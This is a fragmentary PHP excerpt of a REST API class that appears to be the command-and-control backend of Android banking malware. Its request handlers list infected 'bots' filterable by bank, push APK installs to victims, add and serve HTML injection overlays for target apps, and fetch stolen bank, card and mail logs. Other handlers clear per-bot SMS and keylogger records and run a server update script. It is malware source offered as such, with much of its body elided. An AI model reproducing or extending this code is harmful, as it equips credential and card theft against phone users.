...
class restapi{
	...
	function main($params){
		...
		$auth = new auth('localhost', 'phoniex', '..restapipassword..', 'bot');

		$params = json_decode($params);

	if (!$auth->checkValueInDB($params->password)) {
    exit();
	}
		...
		switch($params->request){
			...
			// '{"request":"getBots","currentPage":"1","sorting":"010101000","botsperpage":"6",countrycode:"en",findbyid:"botID"}'

				echo $database->getBots($params->currentPage, isset($params->sorting) ? $params->sorting : "0000000", $params->botsperpage, $params->countrycode, $params->findbyid, $params->findbybank);
			...
			// '{"request":"mainStats"}'
				...
				echo $database->mainStats($params->tag);
			...
			case "installapp":
				...
				echo $database->installApk($params->idbot, $params->app, $params->data);
			...
			// '{"request":"getLogsBank","idbot":"123123", "tag":"pen"}' OR '{"request":"getLogsBank"}'

				$idbot = isset($params->idbot) ? $params->idbot : "";
				$tag = isset($params->tag) ? $params->tag : "";

				echo $database->getLogsInjections("logsBank", $idbot, $tag);	
			...
			// '{"request":"getLogsCC","idbot":"123123"}' OR {"request":"getLogsCC"}'
				...
				if(isset($params->idbot)){
					...
					echo $database->getLogsInjections("logsCC","");
			...
			// '{"request":"getLogsMail","idbot":"123123"}' OR '{"request":"getLogsMail"}'
				...
				if(isset($params->idbot)){
					...
					echo $database->getLogsInjections("logsMail","");
			...
			case "getHtmlFileOfInject": 

			// '{"request":"getHtmlInjection"}'
	
				echo $database->getHtmlFileOfInject($params->app);

				break;

			case "changeStatusInj": 

				// '{"request":"changeStatusInj"}'
		
					echo $database->changeStatusInj($params->app);
			...
			// '{"request":"addHtmlInjection","app":"","html":"","icon":""}'
				...
				echo $database->addHtmlInjection($params->app, $params->html, $params->icon, $params->cat, $params->name);
			...
			// '{"request":"deleteLogsSMS","idbot":""}'
				...
				echo $database->CleanTable('LogsSMS_'.$params->idbot);
			...
			// '{"request":"deleteLogsKeylogger","idbot":""}'
				...
				echo $database->CleanTable('keylogger_'.$params->idbot);
			...
			case "startUpdateCommand":

				exec("/var/www/update.sh ".$database->getArgsForUpdate());
				echo '{"msg":"Update completed"}';
